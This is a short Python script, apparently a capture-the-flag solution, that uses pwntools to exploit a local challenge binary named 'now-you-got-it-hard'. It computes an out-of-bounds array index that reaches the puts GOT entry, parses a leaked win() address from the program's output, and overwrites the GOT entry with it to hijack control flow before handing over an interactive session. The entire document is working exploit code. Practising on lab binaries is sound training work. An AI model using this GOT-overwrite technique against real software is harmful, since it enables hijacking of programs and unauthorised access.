from pwn import *

context.arch = "amd64"
context.log_level = "info"

elf = ELF("/challenge/now-you-got-it-hard")
p = process("/challenge/now-you-got-it-hard")

target_addr = elf.got["puts"]

offset_bytes = target_addr - 0x5dd0
index = offset_bytes // 8

log.info(f"Targeting puts@got. Calculated Index: {index}")

p.recvuntil(b"FREE LEAK: win is located at: ")
win_addr_str = p.recvline().strip()
win_addr = int(win_addr_str, 16) + 0x14
log.info(f"Leaked win() address: {hex(win_addr)}")

p.sendlineafter(b"Which number would you like to view? ", str(index).encode())
p.sendlineafter(
    b"What number would you like to replace it with? ", str(win_addr).encode()
)

p.interactive()
